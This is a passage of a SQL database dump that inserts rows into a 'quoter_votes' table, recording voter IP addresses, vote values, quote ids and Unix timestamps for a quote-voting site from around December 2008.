  (2236,'81.19.66.89','',0,78,1228971976),
  (2237,'81.19.66.89','',0,79,1228971978),
  (2238,'81.19.66.89','',0,80,1228972834),
  (2239,'81.19.66.89','',0,81,1228972837),
  (2240,'66.249.66.47','',0,81,1228973695),
  (2241,'81.19.66.89','',0,82,1228973745),
  (2242,'81.19.66.89','',0,83,1228974421),
  (2243,'81.19.66.89','',0,84,1228974424),
  (2244,'80.237.112.245','',0,98,1228974476),
  (2245,'80.237.112.245','',0,100,1228974480),
  (2246,'66.249.66.47','',0,12,1228974529),
  (2247,'72.30.65.26','',0,46,1228976858),
  (2248,'66.249.66.47','',0,82,1228976914),
  (2249,'72.30.65.26','',0,70,1228977540),
  (2250,'72.30.65.26','',0,38,1228981272),
  (2251,'66.249.66.47','',0,87,1228981473),
  (2252,'72.30.65.26','',0,91,1228981958),
  (2253,'194.246.117.66','',0,101,1228982120),
  (2254,'72.30.65.26','',0,93,1228982299),
  (2255,'89.107.82.174','',0,1,1228983920),
  (2256,'89.107.82.174','',0,55,1228983920),
  (2257,'89.107.82.174','',0,21,1228983923),
  (2258,'89.107.82.174','',0,4,1228983935),
  (2259,'89.107.82.174','',0,2,1228983936),
  (2260,'89.107.82.174','',0,8,1228983938),
  (2261,'80.93.122.5','',0,101,1228984867),
  (2262,'91.202.197.79','',0,96,1228985012),
  (2263,'91.202.197.79','',0,95,1228985019),
  (2264,'91.202.197.79','',0,94,1228985023),
  (2265,'91.202.197.79','',0,92,1228985032),
  (2266,'91.202.197.79','',0,87,1228985109),
  (2267,'91.202.197.79','',0,85,1228985115),
  (2268,'66.249.66.47','',0,82,1228986159),
  (2269,'84.204.148.130','',0,101,1228987241),
  (2270,'77.221.192.190','',0,93,1228987991),
  (2271,'77.221.192.190','',0,94,1228988005),
  (2272,'77.221.192.190','',0,98,1228988057),
  (2273,'195.22.132.3','',0,69,1228988140),
  (2274,'195.22.132.3','',0,68,1228988152),
  (2275,'195.22.132.3','',0,2,1228988246),
  (2276,'79.135.204.234','',0,69,1228988561),
  (2277,'79.135.204.234','',0,68,1228988577),
  (2278,'79.135.204.234','',0,66,1228988804),
  (2279,'195.20.195.133','',0,99,1228988893),
  (2280,'212.98.163.230','',0,101,1228989306),
  (2281,'77.244.213.221','',0,1,1228989525),
  (2282,'91.193.166.194','',0,39,1228990069),
  (2283,'195.78.58.134','',0,93,1228991404),
  (2284,'92.244.233.170','',0,1,1228992607),
  (2285,'92.244.233.170','',0,21,1228992627),
  (2286,'72.30.65.26','',0,48,1228993584),
  (2287,'72.30.65.26','',0,5,1228994060),
  (2288,'66.249.66.47','',0,84,1228994612),
  (2289,'72.30.65.26','',0,38,1228994792),
  (2290,'72.30.65.26','',0,96,1228995075),
  (2291,'72.30.65.26','',0,94,1228995135),
  (2292,'212.7.3.186','',0,80,1228995135),
  (2293,'72.30.65.26','',0,101,1228995157),
  (2294,'72.30.65.26','',0,93,1228995172),
  (2295,'92.47.235.1','',0,21,1228995209),
  (2296,'72.30.65.26','',0,100,1228995272),
  (2297,'195.72.140.150','',0,101,1228995521),
  (2298,'213.242.242.27','',0,80,1228995641),
  (2299,'92.61.67.88','',0,101,1228995657),
  (2300,'83.149.19.4','',0,88,1228995713),
  (2301,'83.149.19.4','',0,87,1228995720),
  (2302,'81.200.211.90','',0,101,1228995783),
  (2303,'92.61.67.88','',0,55,1228995799),
  (2304,'83.149.19.4','',0,55,1228995831),
  (2305,'195.95.215.109','',0,55,1228995981),
  (2306,'195.95.215.109','',0,1,1228996125),
  (2307,'82.200.57.181','',0,95,1228996229),
  (2308,'82.200.57.181','',0,98,1228996248),
  (2309,'87.225.47.163','',0,103,1228996296),
  (2310,'78.107.246.119','',0,102,1228996303),
  (2311,'217.150.202.254','',0,21,1228996306),
  (2312,'78.107.246.119','',0,103,1228996308),
  (2313,'80.91.186.94','',0,93,1228996354),
  (2314,'80.240.210.200','',0,103,1228996392),
  (2315,'217.150.202.254','',0,48,1228996397),
  (2316,'217.76.44.35','',0,93,1228996409),
  (2317,'217.76.44.35','',0,92,1228996416),
  (2318,'217.76.44.35','',0,91,1228996423),
  (2319,'217.76.44.35','',0,85,1228996489),
  (2320,'83.218.242.153','',0,101,1228996833),
  (2321,'72.30.65.26','',0,99,1228996948),
  (2322,'80.254.54.101','',0,99,1228996996),
  (2323,'92.47.118.25','',0,93,1228997060),
  (2324,'213.170.74.12','',0,101,1228997127),
  (2325,'94.181.168.162','',0,96,1228997201),
  (2326,'212.7.3.186','',0,94,1228997238),
  (2327,'195.128.61.131','',0,104,1228997400),
  (2328,'195.39.196.250','',0,95,1228997467),
  (2329,'195.39.196.250','',0,94,1228997480),
  (2330,'195.39.196.250','',0,103,1228997489),
  (2331,'213.79.112.34','',0,53,1228997525),
  (2332,'195.39.196.250','',0,55,1228997527),
  (2333,'156.17.237.13','',0,98,1228997528),
  (2334,'213.184.225.120','',0,101,1228997540),
  (2335,'195.39.196.250','',0,56,1228997596),
  (2336,'156.17.237.13','',0,93,1228997638),
  (2337,'213.184.225.120','',0,98,1228997672),
  (2338,'213.184.225.120','',0,97,1228997698),
  (2339,'156.17.237.13','',0,85,1228997701),
  (2340,'213.184.225.120','',0,96,1228997733),
  (2341,'213.184.225.120','',0,95,1228997752),
  (2342,'213.184.225.120','',0,94,1228997760),
  (2343,'213.184.225.120','',0,93,1228997781),
  (2344,'77.73.67.34','',0,56,1228998108),
  (2345,'77.121.37.201','',0,103,1228998115),
  (2346,'92.124.180.172','',0,105,1228998173),
  (2347,'92.124.180.172','',0,104,1228998182),
  (2348,'77.108.96.42','',0,93,1228998239),
  (2349,'213.243.93.202','',0,103,1228998257),
  (2350,'213.170.74.12','',0,106,1228998336),
  (2351,'89.223.26.87','',0,104,1228998558),
  (2352,'213.243.93.202','',0,55,1228998724),
  (2353,'213.243.93.202','',0,1,1228998741),
  (2354,'192.115.133.27','',0,70,1228998779),
  (2355,'213.243.93.202','',0,29,1228998784),
  (2356,'89.252.105.18','',0,55,1228998796),
  (2357,'77.234.17.78','',0,55,1228998868),
  (2358,'84.204.72.78','',0,9,1228998913),
  (2359,'84.204.72.78','',0,10,1228998958),
  (2360,'79.142.82.62','',0,83,1228998982),
  (2361,'92.242.7.208','',0,82,1228999004),
  (2362,'79.142.82.62','',0,55,1228999073),
  (2363,'92.242.7.208','',0,80,1228999128),
  (2364,'213.79.112.34','',0,107,1228999161),
  (2365,'92.242.7.208','',0,67,1228999204),
  (2366,'92.242.7.208','',0,63,1228999266),
  (2367,'87.225.47.163','',0,108,1228999361),
  (2368,'92.242.7.208','',0,29,1228999388),
  (2369,'79.142.82.62','',0,24,1228999394),
  (2370,'156.17.237.13','',0,55,1228999420),
  (2371,'92.242.7.208','',0,18,1228999440),
  (2372,'156.17.237.13','',0,18,1228999481),
  (2373,'72.30.65.26','',0,65,1228999554),
  (2374,'77.108.96.42','',0,80,1228999559),
  (2375,'77.73.67.34','',0,101,1228999614),
  (2376,'89.208.20.114','',0,55,1228999692),
  (2377,'193.19.67.138','',0,105,1228999702),
  (2378,'193.19.67.138','',0,104,1228999742),
  (2379,'195.144.249.2','',0,107,1228999754),
  (2380,'193.19.67.138','',0,103,1228999816),
  (2381,'87.225.47.163','',0,107,1228999820),
  (2382,'193.19.67.138','',0,98,1228999854),
  (2383,'94.51.131.183','',0,82,1228999866),
  (2384,'94.51.131.183','',0,81,1228999878),
  (2385,'94.51.131.183','',0,93,1228999886),
  (2386,'89.208.20.114','',0,67,1228999886),
  (2387,'193.19.67.138','',0,95,1228999889),
  (2388,'94.51.131.183','',0,83,1228999908),
  (2389,'195.144.249.2','',0,82,1228999912),
  (2390,'89.208.20.114','',0,85,1229000010),
  (2391,'91.193.166.194','',0,107,1229000012),
  (2392,'217.73.131.71','',0,3,1229000077),
  (2393,'217.73.131.71','',0,2,1229000079),
  (2394,'79.135.226.106','',0,85,1229000104),
  (2395,'217.73.131.71','',0,55,1229000106),
  (2396,'194.44.21.57','',0,97,1229000219),
  (2397,'89.113.74.179','',0,55,1229000220),
  (2398,'194.84.220.29','',0,46,1229000248),
  (2399,'194.84.220.29','',0,28,1229000259),
  (2400,'194.84.220.29','',0,43,1229000278),
  (2401,'193.19.67.138','',0,67,1229000292),
  (2402,'194.84.220.29','',0,51,1229000364),
  (2403,'193.19.67.138','',0,63,1229000408),
  (2404,'217.73.131.71','',0,39,1229000427),
  (2405,'194.84.220.29','',0,57,1229000464),
  (2406,'193.151.91.2','',0,107,1229000474),
  (2407,'72.30.65.26','',0,92,1229000519),
  (2408,'87.251.175.106','',0,103,1229000551),
  (2409,'85.236.161.131','',0,108,1229000604),
  (2410,'87.251.175.106','',0,17,1229000638),
  (2411,'92.112.99.18','',0,104,1229000641),
  (2412,'195.50.1.122','',0,106,1229000670),
  (2413,'194.84.220.29','',0,64,1229000701),
  (2414,'87.225.47.163','',0,109,1229000735),
  (2415,'77.247.185.198','',0,105,1229000778),
  (2416,'92.112.99.18','',0,80,1229000781),
  (2417,'77.247.185.198','',0,96,1229000789),
  (2418,'80.250.189.16','',0,93,1229000826),
  (2419,'92.46.47.134','',0,55,1229000862),
  (2420,'194.84.220.29','',0,73,1229000872),
  (2421,'194.44.21.57','',0,78,1229000899),
  (2422,'194.84.220.29','',0,74,1229000927),
  (2423,'193.151.91.2','',0,95,1229000943),
  (2424,'193.151.91.2','',0,93,1229001009),
  (2425,'194.84.220.29','',0,80,1229001033),
  (2426,'91.192.32.50','',0,107,1229001065),
  (2427,'85.30.234.68','',0,107,1229001111),
  (2428,'91.192.32.50','',0,106,1229001117),
  (2429,'193.151.91.2','',0,55,1229001129),
  (2430,'194.84.220.29','',0,82,1229001131),
  (2431,'194.84.220.29','',0,83,1229001149),
  (2432,'193.151.91.2','',0,1,1229001176),
  (2433,'193.151.91.2','',0,18,1229001217),
  (2434,'193.151.91.2','',0,56,1229001227),
  (2435,'194.84.220.29','',0,91,1229001251),
  (2436,'91.187.11.149','',0,107,1229001254),
  (2437,'91.192.32.50','',0,103,1229001291),
  (2438,'87.250.208.77','',0,12,1229001301),
  (2439,'212.26.255.22','',0,10,1229001306),
  (2440,'212.26.255.22','',0,9,1229001312),
  (2441,'85.30.234.68','',0,93,1229001314),
  (2442,'91.187.11.149','',0,103,1229001337),
  (2443,'194.84.220.29','',0,97,1229001348),
  (2444,'91.192.32.50','',0,101,1229001361),
  (2445,'91.187.11.149','',0,55,1229001389),
  (2446,'91.187.11.149','',0,1,1229001398),
  (2447,'91.192.32.50','',0,99,1229001400),
  (2448,'91.187.11.149','',0,18,1229001428),
  (2449,'91.187.11.149','',0,39,1229001492),
  (2450,'193.110.112.228','',0,109,1229001548),
  (2451,'91.192.32.50','',0,98,1229001567),
  (2452,'193.110.112.228','',0,108,1229001589),
  (2453,'91.192.32.50','',0,96,1229001614),
  (2454,'89.109.27.226','',0,103,1229001622),
  (2455,'91.193.166.194','',0,109,1229001636),
  (2456,'91.193.166.194','',0,110,1229001639),
  (2457,'91.192.32.50','',0,95,1229001642),
  (2458,'193.110.112.228','',0,93,1229001704),
  (2459,'91.192.32.50','',0,91,1229001758),
  (2460,'91.192.32.50','',0,90,1229001794),
  (2461,'94.50.123.242','',0,109,1229001813),
  (2462,'87.245.143.75','',0,64,1229001818),
  (2463,'91.192.32.50','',0,88,1229001850),
  (2464,'91.192.32.50','',0,87,1229001870),
  (2465,'89.109.27.226','',0,95,1229001902),
  (2466,'91.192.32.50','',0,86,1229001906),
  (2467,'87.245.143.75','',0,29,1229001944),
  (2468,'89.109.27.226','',0,93,1229001948),
  (2469,'91.192.32.50','',0,82,1229002015),
  (2470,'91.192.32.50','',0,81,1229002036),
  (2471,'94.50.123.242','',0,60,1229002061),
  (2472,'91.192.32.50','',0,79,1229002116),
  (2473,'94.50.123.242','',0,55,1229002122),
  (2474,'92.113.72.248','',0,109,1229002167),
  (2475,'91.192.32.50','',0,76,1229002238),
  (2476,'91.192.32.50','',0,75,1229002281),
  (2477,'91.192.32.50','',0,74,1229002297),
  (2478,'89.109.27.226','',0,67,1229002319),
  (2479,'91.192.32.50','',0,73,1229002348),
  (2480,'82.144.201.65','',0,7,1229002480),
  (2481,'91.192.32.50','',0,67,1229002506),
  (2482,'194.84.220.29','',0,101,1229002539),
  (2483,'91.192.32.50','',0,66,1229002545),
  (2484,'217.195.82.2','',0,55,1229002575),
  (2485,'77.246.97.2','',0,107,1229002594),
  (2486,'91.202.197.79','',0,109,1229002603),
  (2487,'217.195.82.2','',0,1,1229002613),
  (2488,'91.202.197.79','',0,108,1229002613),
  (2489,'91.202.197.79','',0,107,1229002617),
  (2490,'91.192.32.50','',0,64,1229002624),
  (2491,'91.202.197.79','',0,105,1229002630),
  (2492,'194.84.220.29','',0,107,1229002637),
  (2493,'91.192.32.50','',0,62,1229002663),
  (2494,'91.192.32.50','',0,61,1229002820),
  (2495,'91.192.32.50','',0,54,1229002864),
  (2496,'91.202.197.79','',0,95,1229002875),
  (2497,'91.192.32.50','',0,55,1229002938),
  (2498,'91.192.32.50','',0,56,1229002950),
  (2499,'91.192.32.50','',0,50,1229003044),
  (2500,'85.198.123.30','',0,54,1229003085);
COMMIT;

#
# Data for the `quoter_votes` table  (LIMIT 2500,500)
#

INSERT INTO `quoter_votes` (`id`, `ip`, `useragent`, `value`, `quote_id`, `created`) VALUES 
  (2501,'91.192.32.50','',0,48,1229003087),
  (2502,'89.109.27.226','',0,29,1229003091),
  (2503,'194.226.55.52','',0,97,1229003145),
  (2504,'89.178.223.14','',0,12,1229003159),
  (2505,'80.255.64.192','',0,55,1229003179),
  (2506,'89.178.223.14','',0,71,1229003353),
  (2507,'94.31.169.103','',0,108,1229003365),
  (2508,'94.31.169.103','',0,107,1229003380),
  (2509,'91.192.32.50','',0,27,1229003393),
  (2510,'82.144.201.65','',0,10,1229003451),
  (2511,'82.144.201.65','',0,39,1229003503),
  (2512,'94.31.169.103','',0,103,1229003547),
  (2513,'217.119.20.82','',0,29,1229003631),
  (2514,'193.201.198.13','',0,109,1229003744),
  (2515,'217.21.59.28','',0,79,1229003746),
  (2516,'88.204.185.128','',0,55,1229003929),
  (2517,'94.31.169.103','',0,95,1229003930),
  (2518,'87.245.143.75','',0,11,1229003996),
  (2519,'91.192.32.50','',0,19,1229004017),
  (2520,'87.245.143.75','',0,10,1229004017),
  (2521,'91.192.32.50','',0,18,1229004018),
  (2522,'217.113.122.50','',0,78,1229004024),
  (2523,'91.202.197.79','',0,111,1229004087),
  (2524,'87.245.143.75','',0,4,1229004106),
  (2525,'82.144.201.65','',0,81,1229004116),
  (2526,'91.193.166.194','',0,80,1229004151),
  (2527,'94.31.169.103','',0,93,1229004169),
  (2528,'91.192.32.50','',0,11,1229004219),
  (2529,'82.144.201.65','',0,67,1229004252),
  (2530,'87.245.143.75','',0,106,1229004255),
  (2531,'87.245.143.75','',0,101,1229004282),
  (2532,'91.192.32.50','',0,9,1229004333),
  (2533,'194.158.198.113','',0,82,1229004368),
  (2534,'91.192.32.50','',0,7,1229004387),
  (2535,'91.192.32.50','',0,6,1229004395),
  (2536,'87.245.143.75','',0,74,1229004395),
  (2537,'194.158.198.113','',0,81,1229004414),
  (2538,'87.245.143.75','',0,54,1229004452),
  (2539,'91.192.32.50','',0,1,1229004464),
  (2540,'87.245.143.75','',0,27,1229004469),
  (2541,'194.158.198.113','',0,66,1229004476),
  (2542,'194.158.198.113','',0,53,1229004506),
  (2543,'194.158.198.113','',0,42,1229004519),
  (2544,'62.141.90.165','',0,1,1229004546),
  (2545,'194.158.198.113','',0,38,1229004559),
  (2546,'87.245.143.75','',0,56,1229004579),
  (2547,'193.201.198.13','',0,103,1229004598),
  (2548,'82.144.201.65','',0,64,1229004618),
  (2549,'91.193.166.194','',0,42,1229004640),
  (2550,'81.222.193.146','',0,111,1229004652),
  (2551,'82.144.201.65','',0,63,1229004682),
  (2552,'81.222.193.146','',0,70,1229004686),
  (2553,'82.144.201.65','',0,42,1229004720),
  (2554,'81.222.193.146','',0,3,1229004726),
  (2555,'194.158.198.113','',0,18,1229004770),
  (2556,'91.193.166.194','',0,25,1229004780),
  (2557,'82.198.197.57','',0,39,1229004809),
  (2558,'195.158.248.3','',0,98,1229004824),
  (2559,'82.144.201.65','',0,93,1229004865),
  (2560,'82.144.201.65','',0,111,1229004912),
  (2561,'85.141.199.143','',0,107,1229004943),
  (2562,'195.158.248.3','',0,93,1229004951),
  (2563,'81.3.148.134','',0,21,1229004991),
  (2564,'194.44.56.246','',0,39,1229004996),
  (2565,'77.35.254.206','',0,112,1229005042),
  (2566,'195.158.248.3','',0,88,1229005043),
  (2567,'84.47.179.31','',0,101,1229005077),
  (2568,'84.47.179.31','',0,106,1229005136),
  (2569,'84.47.179.31','',0,102,1229005153),
  (2570,'85.141.199.143','',0,93,1229005167),
  (2571,'195.158.248.3','',0,81,1229005242),
  (2572,'89.19.169.12','',0,101,1229005340),
  (2573,'89.186.226.243','',0,113,1229005373),
  (2574,'89.186.226.243','',0,111,1229005392),
  (2575,'89.186.226.243','',0,107,1229005428),
  (2576,'141.14.28.118','',0,100,1229005453),
  (2577,'89.186.226.243','',0,106,1229005471),
  (2578,'212.9.227.182','',0,20,1229005504),
  (2579,'79.171.124.139','',0,113,1229005588),
  (2580,'79.171.124.139','',0,107,1229005737),
  (2581,'79.171.124.139','',0,110,1229005742),
  (2582,'82.138.55.2','',0,56,1229006055),
  (2583,'82.138.55.2','',0,109,1229006121),
  (2584,'82.138.55.2','',0,95,1229006305),
  (2585,'89.191.241.225','',0,78,1229006307),
  (2586,'195.69.244.138','',0,109,1229006400),
  (2587,'195.69.244.138','',0,104,1229006447),
  (2588,'81.23.22.17','',0,95,1229006479),
  (2589,'82.138.55.2','',0,55,1229006662),
  (2590,'82.138.55.2','',0,1,1229006675),
  (2591,'89.17.48.3','',0,102,1229006989),
  (2592,'77.121.56.31','',0,109,1229006993),
  (2593,'77.121.56.31','',0,107,1229007014),
  (2594,'72.30.79.30','',0,67,1229007021),
  (2595,'77.35.24.232','',0,113,1229007026),
  (2596,'89.17.48.3','',0,101,1229007037),
  (2597,'79.133.133.39','',0,55,1229007087),
  (2598,'84.204.72.78','',0,21,1229007147),
  (2599,'89.222.174.12','',0,113,1229007199),
  (2600,'79.133.133.39','',0,29,1229007229),
  (2601,'81.3.160.140','',0,101,1229007258),
  (2602,'93.84.186.229','',0,54,1229007332),
  (2603,'84.204.72.78','',0,18,1229007362),
  (2604,'89.20.106.7','',0,112,1229007373),
  (2605,'195.239.121.206','',0,115,1229007384),
  (2606,'195.239.121.206','',0,111,1229007415),
  (2607,'195.239.121.206','',0,101,1229008031),
  (2608,'62.181.43.110','',0,109,1229008202),
  (2609,'87.117.3.10','',0,115,1229008219),
  (2610,'81.25.38.229','',0,115,1229008311),
  (2611,'81.25.38.229','',0,114,1229008336),
  (2612,'212.45.20.50','',0,111,1229008337),
  (2613,'81.25.38.229','',0,109,1229008346),
  (2614,'81.25.38.229','',0,107,1229008351),
  (2615,'81.25.38.229','',0,105,1229008364),
  (2616,'81.25.38.229','',0,95,1229008364),
  (2617,'212.108.100.101','',0,111,1229008366),
  (2618,'212.45.20.50','',0,94,1229008370),
  (2619,'81.25.38.229','',0,55,1229008416),
  (2620,'81.25.38.229','',0,1,1229008420),
  (2621,'81.25.38.229','',0,18,1229008430),
  (2622,'194.44.62.149','',0,111,1229008433),
  (2623,'81.25.43.49','',0,115,1229008447),
  (2624,'81.25.38.229','',0,67,1229008471),
  (2625,'62.181.43.110','',0,80,1229008479),
  (2626,'195.91.175.196','',0,107,1229008503),
  (2627,'193.46.86.228','',0,55,1229008564),
  (2628,'91.142.162.226','',0,101,1229008580),
  (2629,'212.45.20.50','',0,21,1229008602),
  (2630,'212.45.20.50','',0,106,1229008627),
  (2631,'77.41.76.120','',0,114,1229008686),
  (2632,'77.41.76.120','',0,113,1229008704),
  (2633,'94.180.194.150','',0,108,1229008704),
  (2634,'217.74.47.2','',0,21,1229008709),
  (2635,'93.181.217.83','',0,97,1229008711),
  (2636,'90.191.178.89','',0,56,1229074651),
  (2637,'84.201.238.242','',0,101,1229074657),
  (2638,'213.79.112.34','',0,107,1229074694),
  (2639,'217.21.172.62','',0,101,1229074847),
  (2640,'217.21.172.62','',0,106,1229074854),
  (2641,'79.133.75.58','',0,101,1229074866),
  (2642,'217.21.172.62','',0,51,1229074877),
  (2643,'217.21.172.62','',0,79,1229075067),
  (2644,'81.33.28.69','',0,109,1229075211),
  (2645,'85.21.111.110','',0,29,1229075299),
  (2646,'84.204.148.130','',0,111,1229075302),
  (2647,'78.24.224.175','',0,104,1229075307),
  (2648,'213.134.196.106','',0,109,1229075329),
  (2649,'78.24.224.175','',0,55,1229075414),
  (2650,'78.24.224.175','',0,1,1229075416),
  (2651,'81.33.28.69','',0,93,1229075420),
  (2652,'78.24.224.175','',0,29,1229075420),
  (2653,'213.134.196.106','',0,104,1229075429),
  (2654,'78.24.224.175','',0,81,1229075480),
  (2655,'78.24.224.175','',0,4,1229075482),
  (2656,'81.33.28.69','',0,82,1229075486),
  (2657,'194.186.219.72','',0,1,1229075517),
  (2658,'86.41.112.231','',0,107,1229075560),
  (2659,'212.3.104.22','',0,115,1229075563),
  (2660,'89.179.122.69','',0,55,1229075593),
  (2661,'212.3.104.22','',0,109,1229075615),
  (2662,'89.179.122.69','',0,1,1229075624),
  (2663,'217.21.172.62','',0,90,1229075625),
  (2664,'212.3.104.22','',0,104,1229075627),
  (2665,'86.41.112.231','',0,101,1229075632),
  (2666,'89.179.122.69','',0,29,1229075647),
  (2667,'89.179.122.69','',0,56,1229075680),
  (2668,'89.179.122.69','',0,39,1229075692),
  (2669,'212.3.104.22','',0,93,1229075693),
  (2670,'89.179.122.69','',0,67,1229075704),
  (2671,'89.179.122.69','',0,114,1229075750),
  (2672,'212.3.104.22','',0,81,1229075756),
  (2673,'212.3.104.22','',0,67,1229075788),
  (2674,'89.179.122.69','',0,107,1229075802),
  (2675,'81.200.17.20','',0,111,1229075885),
  (2676,'212.3.104.22','',0,116,1229075977),
  (2677,'217.74.47.124','',0,111,1229076018),
  (2678,'212.3.104.22','',0,18,1229076042),
  (2679,'193.232.92.13','',0,101,1229076044),
  (2680,'217.74.47.124','',0,107,1229076084),
  (2681,'80.243.71.189','',0,116,1229076198),
  (2682,'194.79.8.45','',0,112,1229076273),
  (2683,'194.79.8.45','',0,95,1229076486),
  (2684,'193.232.92.13','',0,51,1229076800),
  (2685,'87.249.58.45','',0,116,1229076834),
  (2686,'87.249.58.45','',0,114,1229076864),
  (2687,'193.232.92.13','',0,104,1229076885),
  (2688,'91.77.241.118','',0,115,1229076905),
  (2689,'91.77.241.118','',0,114,1229076910),
  (2690,'193.232.92.13','',0,61,1229076929),
  (2691,'194.44.237.242','',0,101,1229076937),
  (2692,'91.77.241.118','',0,116,1229076951),
  (2693,'87.249.58.45','',0,106,1229076965),
  (2694,'87.249.58.45','',0,101,1229076978),
  (2695,'194.79.8.45','',0,67,1229077001),
  (2696,'62.213.82.34','',0,115,1229077039),
  (2697,'194.79.8.45','',0,64,1229077062),
  (2698,'217.65.14.16','',0,107,1229077092),
  (2699,'194.79.8.45','',0,42,1229077093),
  (2700,'194.79.8.45','',0,39,1229077100),
  (2701,'62.213.82.34','',0,114,1229077117),
  (2702,'213.134.196.106','',0,29,1229077135),
  (2703,'92.255.4.11','',0,75,1229077276),
  (2704,'82.144.212.86','',0,78,1229077328),
  (2705,'82.144.212.86','',0,74,1229077408),
  (2706,'194.79.8.45','',0,17,1229077442),
  (2707,'194.79.8.45','',0,20,1229077458),
  (2708,'79.171.10.110','',0,74,1229077468),
  (2709,'62.76.193.21','',0,105,1229077473),
  (2710,'194.79.8.45','',0,2,1229077540),
  (2711,'195.144.235.170','',0,101,1229077546),
  (2712,'194.79.8.45','',0,1,1229077549),
  (2713,'195.144.235.170','',0,102,1229077552),
  (2714,'94.255.8.36','',0,115,1229077611),
  (2715,'87.224.202.176','',0,93,1229077613),
  (2716,'84.22.141.12','',0,101,1229077624),
  (2717,'87.224.202.176','',0,109,1229077629),
  (2718,'78.138.136.208','',0,111,1229077643),
  (2719,'195.144.235.170','',0,61,1229077645),
  (2720,'86.57.254.230','',0,101,1229077776),
  (2721,'78.138.136.208','',0,99,1229077846),
  (2722,'86.57.254.230','',0,72,1229078006),
  (2723,'78.138.136.208','',0,93,1229078016),
  (2724,'81.200.211.90','',0,101,1229078094),
  (2725,'72.30.87.108','',0,16,1229078099),
  (2726,'193.232.92.13','',0,93,1229078121),
  (2727,'78.138.136.208','',0,96,1229078160),
  (2728,'78.138.136.208','',0,87,1229078203),
  (2729,'195.95.215.109','',0,115,1229078267),
  (2730,'78.138.136.208','',0,74,1229078336),
  (2731,'79.133.87.191','',0,94,1229078341),
  (2732,'94.178.40.53','',0,111,1229078384),
  (2733,'195.158.17.158','',0,107,1229078513),
  (2734,'83.242.255.58','',0,108,1229078554),
  (2735,'94.50.141.146','',0,11,1229078652),
  (2736,'195.158.17.158','',0,39,1229078678),
  (2737,'62.173.130.78','',0,55,1229078758),
  (2738,'213.172.28.137','',0,111,1229078788),
  (2739,'62.173.130.78','',0,18,1229078800),
  (2740,'78.85.34.47','',0,78,1229079292),
  (2741,'217.22.172.73','',0,114,1229079503),
  (2742,'78.85.34.47','',0,80,1229079537),
  (2743,'66.249.66.47','',0,17,1229079567),
  (2744,'212.12.18.234','',0,101,1229079693),
  (2745,'78.85.34.47','',0,112,1229079760),
  (2746,'212.12.18.234','',0,51,1229079859),
  (2747,'81.26.156.31','',0,111,1229079985),
  (2748,'87.245.143.75','',0,120,1229079986),
  (2749,'85.173.31.251','',0,120,1229080051),
  (2750,'78.29.2.25','',0,117,1229080052),
  (2751,'87.245.143.75','',0,114,1229080062),
  (2752,'87.245.143.75','',0,112,1229080074),
  (2753,'193.232.92.13','',0,85,1229080091),
  (2754,'78.29.2.25','',0,94,1229080094),
  (2755,'89.223.12.59','',0,104,1229080096),
  (2756,'78.29.2.25','',0,76,1229080113),
  (2757,'85.249.145.190','',0,120,1229080122),
  (2758,'78.29.2.36','',0,75,1229080135),
  (2759,'81.26.156.31','',0,106,1229080137),
  (2760,'78.85.34.47','',0,55,1229080145),
  (2761,'217.237.175.148','',0,117,1229080161),
  (2762,'62.105.132.234','',0,55,1229080191),
  (2763,'78.85.34.47','',0,29,1229080223),
  (2764,'193.232.92.13','',0,82,1229080273),
  (2765,'193.232.92.13','',0,81,1229080347),
  (2766,'72.30.87.108','',0,54,1229080363),
  (2767,'81.26.156.31','',0,100,1229080407),
  (2768,'193.232.92.13','',0,78,1229080595),
  (2769,'91.202.197.79','',0,120,1229080632),
  (2770,'91.202.197.79','',0,117,1229080640),
  (2771,'91.202.197.79','',0,116,1229080643),
  (2772,'91.202.197.79','',0,119,1229080664),
  (2773,'91.202.197.79','',0,111,1229080682),
  (2774,'217.21.172.62','',0,120,1229080707),
  (2775,'217.21.172.62','',0,119,1229080719),
  (2776,'193.93.218.64','',0,120,1229080744),
  (2777,'78.24.226.70','',0,119,1229080837),
  (2778,'212.98.164.146','',0,111,1229080902),
  (2779,'91.202.197.79','',0,118,1229081231),
  (2780,'212.75.202.130','',0,112,1229081333),
  (2781,'194.246.116.62','',0,101,1229081417),
  (2782,'94.41.17.151','',0,29,1229081511),
  (2783,'80.94.231.171','',0,120,1229081547),
  (2784,'94.41.17.151','',0,56,1229081575),
  (2785,'217.21.60.184','',0,118,1229081582),
  (2786,'94.41.17.151','',0,39,1229081632),
  (2787,'72.30.87.108','',0,120,1229081643),
  (2788,'72.30.87.108','',0,118,1229081694),
  (2789,'72.30.87.108','',0,119,1229081702),
  (2790,'195.98.32.109','',0,55,1229081725),
  (2791,'80.80.111.200','',0,111,1229081864),
  (2792,'82.144.208.154','',0,120,1229081908),
  (2793,'86.57.253.57','',0,119,1229081986),
  (2794,'80.80.111.200','',0,120,1229082030),
  (2795,'80.94.231.171','',0,21,1229082128),
  (2796,'89.218.205.71','',0,119,1229082246),
  (2797,'89.218.205.71','',0,120,1229082268),
  (2798,'89.218.205.71','',0,116,1229082288),
  (2799,'89.218.205.71','',0,115,1229082311),
  (2800,'217.115.75.230','',0,55,1229082331),
  (2801,'89.218.205.71','',0,112,1229082388),
  (2802,'89.218.205.71','',0,111,1229082404),
  (2803,'217.159.130.58','',0,116,1229082492),
  (2804,'86.57.253.57','',0,96,1229082500),
  (2805,'217.159.130.58','',0,115,1229082504),
  (2806,'217.159.130.58','',0,109,1229082512),
  (2807,'217.159.130.58','',0,107,1229082514),
  (2808,'217.159.130.58','',0,105,1229082517),
  (2809,'217.159.130.58','',0,104,1229082522),
  (2810,'86.57.253.57','',0,56,1229082571),
  (2811,'85.249.145.190','',0,119,1229082573),
  (2812,'217.159.130.58','',0,98,1229082775),
  (2813,'217.159.130.58','',0,95,1229082803),
  (2814,'77.91.129.241','',0,111,1229082866),
  (2815,'217.159.130.58','',0,93,1229082918),
  (2816,'91.202.197.79','',0,95,1229082987),
  (2817,'85.25.120.147','',0,121,1229083087),
  (2818,'86.57.253.57','',0,99,1229083200),
  (2819,'85.140.157.10','',0,56,1229083276),
  (2820,'85.25.120.147','',0,112,1229083351),
  (2821,'217.159.130.58','',0,83,1229083393),
  (2822,'217.159.130.58','',0,80,1229083445),
  (2823,'217.159.130.58','',0,81,1229083454),
  (2824,'217.21.172.62','',0,121,1229083477),
  (2825,'92.112.108.33','',0,99,1229083481),
  (2826,'217.21.172.62','',0,90,1229083525),
  (2827,'77.239.180.7','',0,3,1229083720),
  (2828,'77.239.180.7','',0,77,1229083733),
  (2829,'85.25.120.147','',0,115,1229083817),
  (2830,'194.44.62.149','',0,116,1229083879),
  (2831,'85.249.167.183','',0,122,1229083933),
